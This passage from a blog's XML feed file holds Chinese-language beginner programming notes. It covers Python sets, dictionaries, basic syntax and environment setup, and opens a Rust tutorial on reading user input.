<code>S.issubset(T)</code></td><td><strong>判断子集</strong>。如果 S 与 T 相同或 S 是 T 的子集,返回 True ,否则返回 False 。可以用 S &lt; T 判断 S 是否是 T 的真子集</td></tr><tr><td><code>S &gt;= Т</code> 或 <code>S.issuperset(T)</code></td><td><strong>判断超集</strong>。如果 S 与 T 相同或 S 是 T 的超集,返回 True ,否则返回 False 。可以用 S &gt; T 判断 S 是否是 T 的真超集</td></tr></tbody></table><h3 id="集合其他内置方法">集合其他内置方法</h3><p><strong>统计元素个数</strong></p><ul><li><code>set.len()</code></li></ul><p><strong>添加</strong></p><ul><li><code>set.add(obj, ...)</code> 将单个元素添加至集合中</li><li><code>set.update(seq, ...)</code> 添加一个序列（列表、元组、字典）</li></ul><p><strong>删除</strong></p><ul><li><code>set.remove(obj)</code> 移除一个元素，找不到时会报错</li><li><code>set.discard(obj)</code> 移除一个元素，但是找不到时不会报错</li><li><code>set.pop()</code> 随机移除一个元素，并返回他的值</li><li><code>set.clear()</code> 清空集合</li></ul><p><strong>复制</strong></p><ul><li><code>set.copy()</code></li></ul><p><strong>判断是否存在</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x <span class="keyword">in</span> s</span><br></pre></td></tr></table></figure><h2 id="dictionary-字典">Dictionary 字典</h2><p>字典是一种依靠<strong>键值对</strong>存储数据的容器类模型</p><h3 id="创建字典">创建字典</h3><p>字典的每个键值<code>key=&gt;value</code>对用冒号<code>:</code>分割，每个对之间用逗号<code>,</code>分割，整个字典包括在花括号<code>&#123;&#125;</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;IceWindy&#x27;</span>, <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;www.icewindy.cn&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>一般而言，为了让代码更可读，我们会写成多行的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;IceWindy&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;www.icewindy.cn&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问字典">访问字典</h3><h4 id="key-value">key=&gt;value</h4><ul><li><p>直接使用key当索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">personInfo = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, </span><br><span class="line">    <span class="string">&#x27;hobby&#x27;</span>: [<span class="string">&#x27;reading&#x27;</span>, <span class="string">&#x27;running&#x27;</span>, <span class="string">&#x27;swimming&#x27;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(personInfo[<span class="string">&#x27;name&#x27;</span>]) <span class="comment"># Tom</span></span><br><span class="line"><span class="built_in">print</span>(personInfo[<span class="string">&#x27;age&#x27;</span>]) <span class="comment"># 18</span></span><br><span class="line"><span class="built_in">print</span>(personInfo[<span class="string">&#x27;hobby&#x27;</span>]) <span class="comment"># [&#x27;reading&#x27;, &#x27;running&#x27;, &#x27;swimming&#x27;]</span></span><br></pre></td></tr></table></figure></li><li><p>使用<code>get()</code></p><p><code>get()</code>的第一个参数是要查询的键，第二个参数是键不存在时返回的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">personInfo = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, </span><br><span class="line">    <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;student&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">job = personInfo.get(<span class="string">&#x27;job&#x27;</span>, <span class="string">&quot;Tom didn&#x27;t have a job yet!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(job) <span class="comment"># student</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> personInfo[<span class="string">&#x27;job&#x27;</span>]</span><br><span class="line">job = personInfo.get(<span class="string">&#x27;job&#x27;</span>, <span class="string">&quot;Tom didn&#x27;t have a job yet!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(job) <span class="comment"># Tom didn&#x27;t have a job yet!</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="遍历">遍历</h4><p>使用<code>for...in dict.items()/key()/values()</code>即可遍历，后面的三个方法分别是遍历key与value，key，value的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key , value <span class="keyword">in</span> favoriteLanguages.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Key: &#x27;</span>+key+<span class="string">&#x27; Value: &#x27;</span>+value)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> favoriteLanguages.values():</span><br><span class="line">    <span class="built_in">print</span>(language)</span><br><span class="line"><span class="keyword">for</span> language <span class="keyword">in</span> favoriteLanguages.values():</span><br><span class="line">    <span class="built_in">print</span>(language)</span><br></pre></td></tr></table></figure><h3 id="改变字典">改变字典</h3><h4 id="添加-修改">添加、修改</h4><p>添加与修改的方式都一样，通过<code>字典名[键]=值</code>的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">favoriteLanguages = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarch&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">favoriteLanguages[<span class="string">&#x27;mike&#x27;</span>] = <span class="string">&#x27;java&#x27;</span> <span class="comment">#添加</span></span><br><span class="line">favoriteLanguages[<span class="string">&#x27;jen&#x27;</span>] = <span class="string">&#x27;java&#x27;</span> <span class="comment">#修改</span></span><br></pre></td></tr></table></figure><h4 id="删除">删除</h4><p>删除一对键值对的方式通过<code>del 字典名[键]</code>方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> favoriteLanguages[<span class="string">&#x27;jen&#x27;</span>] </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础笔记（2）：基础语法</title>
      <link href="/2023/01/05/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/01/05/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="标识符">标识符</h2><p>Python中的标识符规则与大多数语言都类似：</p><ul><li>第一个字符必须是字母表中字母或下划线 <strong>_</strong> 。</li><li>标识符的其他的部分由字母、数字和下划线组成。</li><li>标识符对大小写敏感。</li><li>在Python3中非ASCII标识符也受允许，例如中文</li></ul><p>与其他语言不同的是，Python中标识符前后的下划线是具有特殊含义的，起着Java等语言中public等关键词的作用：</p><ul><li><p>单下划线开头 _var</p><p>说明是仅供内部使用的方法变量，举个例子</p><p>首先创建一个test.py模块，包含了一个带下划线和不带下划线的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO Hello&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着我们去引用这个模块，并分别调用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> test <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">func()</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202301062053313.png" alt="image-20230106205354270"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> test <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">_func()</span><br></pre></td></tr></table></figure><img src="https://image.icewindy.cn/202301062054431.png" alt="image-20230106205451409" style="zoom:80%;" /><p>这时候它告诉我们 _func 没有定义，它只能被模块内部使用。</p></li></ul><h2 id="简单输入输出">简单输入输出</h2><p>使用<code>input()</code>与<code>print()</code>实现在命令行窗口简单输入输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入内容：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你输入的内容是：&quot;</span>，<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>与其他语言不同的是，<code>print()</code>默认是换行输出的，如果需要实现不换行，则需要额外多一个参数<code>end=&quot;&quot;</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;World&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="行与缩进">行与缩进</h2><h3 id="缩进">缩进</h3><p>Python与其他语言相比最大的特色之一就是以缩进标识代码结构，而不使用大括号、分号等。</p><p>缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure><p>以下代码最后一行语句缩进数的空格数不一致，会导致运行错误：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Answer&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)    <span class="comment"># 缩进不一致，会导致运行错误</span></span><br></pre></td></tr></table></figure><p>不要混用制表符Tab与空格，虽然他们有时候看起来是一样的，但是在Python看起来，他们是不一样的缩进，因此也会让程序无法正常运行。</p><p>Python也可也在同一行显示多段代码，使用分号<code>;</code>即可达到该效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="空行">空行</h3><p>函数之间或者类的方法之间用空格分割，表示为一段新的代码的开始，类与函数入口也用一行空格分割，以分辨开始。</p><p>空格作为分割虽然不是Python语法的一部分，即使不使用空格，解释器也不会出错，但是IDE会给出提示，而且这在划分两段不同功能或含义的方式，可以便于日后代码的维护或者重构。</p><h3 id="一句话分多行">一句话分多行</h3><p>Python 通常是一行写完一条语句，但如果语句很长，我们可以在行末使用续行符（反斜杠<code>\</code>）来实现多行语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure><p>在 <code>[]</code>, <code>&#123;&#125;</code>, 或 <code>()</code> 中的多行语句，不需要使用反斜杠 <code>\</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">total = [<span class="string">&#x27;item_one&#x27;</span>, <span class="string">&#x27;item_two&#x27;</span>, <span class="string">&#x27;item_three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;item_four&#x27;</span>, <span class="string">&#x27;item_five&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="引入模块和函数">引入模块和函数</h2><p>在 Python 用 <code>import</code> 或者 <code>from...import</code> 来导入相应的模块</p><ul><li>将整个模块导入，格式为： <code>import somemodule</code></li><li>从某个模块中导入某个函数,格式为： <code>from somemodule import somefunction</code></li><li>从某个模块中导入多个函数,格式为： <code>from somemodule import firstfunc, secondfunc, thirdfunc</code></li><li>将某个模块中的全部函数导入，格式为： <code>from somemodule import *</code></li></ul><h2 id="变量与赋值">变量与赋值</h2><p>python中，每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</p><p>在 Python 中，变量就是变量，它没有类型，我们所说的&quot;类型&quot;是变量所指的内存中对象的类型。</p><h3 id="单个变量赋值">单个变量赋值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">counter = <span class="number">100</span>          <span class="comment"># 整型变量</span></span><br><span class="line">miles   = <span class="number">1000.0</span>       <span class="comment"># 浮点型变量</span></span><br><span class="line">name    = <span class="string">&quot;HelloWorld&quot;</span>     <span class="comment"># 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (counter)</span><br><span class="line"><span class="built_in">print</span> (miles)</span><br><span class="line"><span class="built_in">print</span> (name)</span><br></pre></td></tr></table></figure><h3 id="多个变量赋值">多个变量赋值</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;HelloWorld&quot;</span></span><br></pre></td></tr></table></figure><h2 id="标准数据类型">标准数据类型</h2><p>Python3 中有六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中，分为两种数据，一种为只能被整体重新赋值的“不可变数据”，另外一种是可以改变其中一部分的“可变数据”：</p><ul><li><strong>不可变数据（3 个）：</strong> Number（数字）、String（字符串）、Tuple（元组）</li><li><strong>可变数据（3 个）：</strong> List（列表）、Dictionary（字典）、Set（集合）</li></ul><h3 id="判断变量的对象类型">判断变量的对象类型</h3><h4 id="使用-type-来查询">使用 <code>type()</code> 来查询</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a, b, c, d = <span class="number">20</span>, <span class="number">5.5</span>, <span class="literal">True</span>, <span class="number">4</span>+<span class="number">3j</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">type</span>(a), <span class="built_in">type</span>(b), <span class="built_in">type</span>(c), <span class="built_in">type</span>(d))</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt; &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt; &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="使用-isinstance-来判断">使用 <code>isinstance()</code> 来判断</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">111</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">isinstance</span>(a, <span class="built_in">int</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="判断与循环">判断与循环</h2><h3 id="if">If</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> &lt;condition_1&gt;:</span><br><span class="line">    &lt;statement_1&gt;</span><br><span class="line"><span class="keyword">elif</span> &lt;condition_2&gt;:</span><br><span class="line">    &lt;statement_2&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statement_3&gt;</span><br></pre></td></tr></table></figure><h3 id="for">For</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &lt;variable&gt; <span class="keyword">in</span> &lt;sequence&gt;:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statements&gt;</span><br></pre></td></tr></table></figure><p><code>break</code> 和 <code>continue</code> 在 <code>for</code> 中有效，<code>else</code> 为可选</p><h3 id="while">While</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> &lt;condition&gt;:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statements&gt;</span><br></pre></td></tr></table></figure><p><code>break</code> 和<code>continue</code> 在 <code>While</code> 中有效，<code>else</code> 为可选</p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础笔记（1）：简介、环境部署</title>
      <link href="/2023/01/03/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%AE%80%E4%BB%8B%E3%80%81%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
      <url>/2023/01/03/Python%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E7%AE%80%E4%BB%8B%E3%80%81%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="python简介">Python简介</h2><p>Python是一门解释性语言，简单易学，上手容易。</p><p>因此作为一门胶水语言，在许多非计算机专业都有广泛学习。为了可以编写一些简单的脚本，学习Python还是有一定的必要性的。</p><p>本笔记基本内容为根据</p><ul><li>Python3</li><li>菜鸟教程 <a href="https://www.runoob.com/python3/python3-tutorial.html">Python3 教程 | 菜鸟教程 (runoob.com)</a></li><li>NX的博客 <a href="https://www.nickxu.top/tags/Python/">Python | NX の 博客 (nickxu.top)</a></li></ul><p>所编写。</p><h2 id="环境部署">环境部署</h2><p>前往官网<a href="https://www.python.org/">Python.org</a>下载最新的Python安装包，按流程安装。</p><p>在代码编辑器上有两个推荐，一个是VSCode，一个是Pycharm：</p><p>VSCode在拓展应用商店安装Python插件与Code Runner插件即可</p><p><img src="https://image.icewindy.cn/202301050111564.png" alt="image-20230105011136451"></p><p>Pycharm的配置与安装不再赘述，向导非常详细，遵循向导即可</p><p><img src="https://image.icewindy.cn/202301050113086.png" alt="image-20230105011313028"></p><p>当然，作为一个解释型语言，我们也可以在命令行中进行交互式的编程，但是这种方式并不是很常用。</p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust基础笔记（1）：基础结构</title>
      <link href="/2022/12/04/Rust%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%BB%93%E6%9E%84/"/>
      <url>/2022/12/04/Rust%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="序">序</h2><p>此笔记为在学习Rust圣经《The Rust Programming Language》时记录的笔记，为基础学习</p><p>中文版书籍：<a href="https://kaisery.github.io/trpl-zh-cn/title-page.html">Rust 程序设计语言 - Rust 程序设计语言 简体中文版 (kaisery.github.io)</a></p><p>安装过程不再赘述，可直接参考Rust官方网站的安装过程</p><p>官方网站地址：<a href="https://www.rust-lang.org/">Rust Programming Language (rust-lang.org)</a></p><p>本人开发环境为：</p><ul><li>ManjaroWSL2</li><li>Clion</li></ul><p>学习Rust纯属为个人一时兴起，本笔记随时弃坑。</p><h2 id="一个简单的rust程序">一个简单的Rust程序</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guess the number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = String::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Your guessed: &#123;guess&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://image.icewindy.cn/202212050122081.png" alt="image-20221205012227933"></p><p>这个程序的逻辑很简单，就是处理用户的输入，把用户的输入进行输出。</p><p>但是这个程序拥有了Rust程序的基本结构，我们从上直下解析这个程序：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br></pre></td></tr></table></figure><p>为了获取的用户输入，我们需要导入输入输出库(input / output)，即<code>io</code>库。<code>io</code>库来自于标准库，即<code>std</code>。这个操作类似于c语言的<code>include</code>，或者是Java的<code>import</code>。</p><p>在默认的情况下，Rust会自动导入部分标准库到每个程序作用域，这部分被称为<code>预导入</code>，若我们所需要用的不在其中，则需要我们手动使用<code>use</code>显式导入。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br></pre></td></tr></table></figure><p><code>fn</code>用于声明新函数，main函数是程序的入口点。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Guess the number!&quot;</span>);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>);</span><br></pre></td></tr></table></figure><p>在这里<code>println!</code>用于在屏幕中打印字符串。</p><p>**注意：**它并不是一个函数，而是一个宏，<code>!</code>的基本上都是宏。</p><p><strong>使用变量存储值</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = String::<span class="title function_ invoke__">new</span>();</span><br></pre></td></tr></table></figure><p>在这里我们创建了一个空的字符串变量用于存储输入，我们注意到，与很多常见的编程语言不同，我们申明用了两个关键词<code>let mut</code>：</p><p>这是因为Rust中，<code>变量默认是不可变的</code>，因此我们如果使用<code>let guess</code>的话，会使得<code>guess</code>类似其他编程语言中的常量一样，不可变，因此我们还要通过<code>mut</code>关键词使得变量可变。</p><p><code>=</code>是在告诉Rust，我们想将某个值<code>绑定</code>在变量上。因此我们将<code>String::new()</code>的结果绑定到了<code>guess</code>上，它的结果是一个<code>String</code>的新实例。</p><p><code>::new()</code>注意，这里的new()并不是String的特定函数，而是一个跟Java静态方法一样的<code>关联函数</code>。在这里<code>::</code>就表明了new是String的关联函数。new函数是<code>创建类型实例的惯用函数</code>。</p><p><strong>接受输入与异常处理</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">   .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">   .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line.&quot;</span>);</span><br></pre></td></tr></table></figure><p>现在我们调用一开始导入的<code>io</code>库中的函数接受用户的输入，我们使用了<code>stdin</code>函数，<code>stdin</code>函数返回了一个<code>std::io::Stdin</code>的实例，这是终端标准输入句柄类型。</p><p><code>.read_line(&amp;mut guess)</code>调用了<code>read_line</code>方法，从句柄中获取到用户的一行输入，并将其<code>追加</code>到参数中，因为我们传入的参数应该是可变的。</p><p><code>&amp;</code>代表了<strong>引用</strong>，它使得程序中不同处的代码可以访问同一处的数据。它与变量相同，默认都是不可变，因此我们需要将其写成<code>&amp;mut guess</code>以使其可变。</p><p><code>.expect(&quot;Failed to read line.&quot;)</code>的作用就是异常处理。<code>read_line</code>会返回一个<code>Result</code>类型，<code>Result</code>是一个枚举类型，其中包含了<code>Ok</code>与<code>Err</code>，分别代表操作成功与失败。</p><p><code>Result</code>类型的实例拥有一个expect方法，若<code>Result</code>实例的值为<code>Err</code>，expect方法会导致程序崩溃，并显示expect中传入的值，若<code>Result</code>实例的值为<code>Ok</code>，则会原样返回<code>Ok</code>中的值。</p><p><strong>占位符打印值</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Your guessed: &#123;guess&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>这行代码打印了保存在guess变量中用户输入的值。里面的<code>&#123;&#125;</code>为一个预留给变量类的占位符号，我们除了把变量直接写在<code>&#123;&#125;</code>中，我们还可以在双引号的外面按顺序写值，这个跟c类似，应该不陌生：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;x = &#123;&#125;, y = &#123;&#125;&quot;</span>, x, y);</span><br></pre></td></tr></table></figure><p>第一个占位符使用第一个值，第二个占用符使用第二个值…以此类推。</p><h2 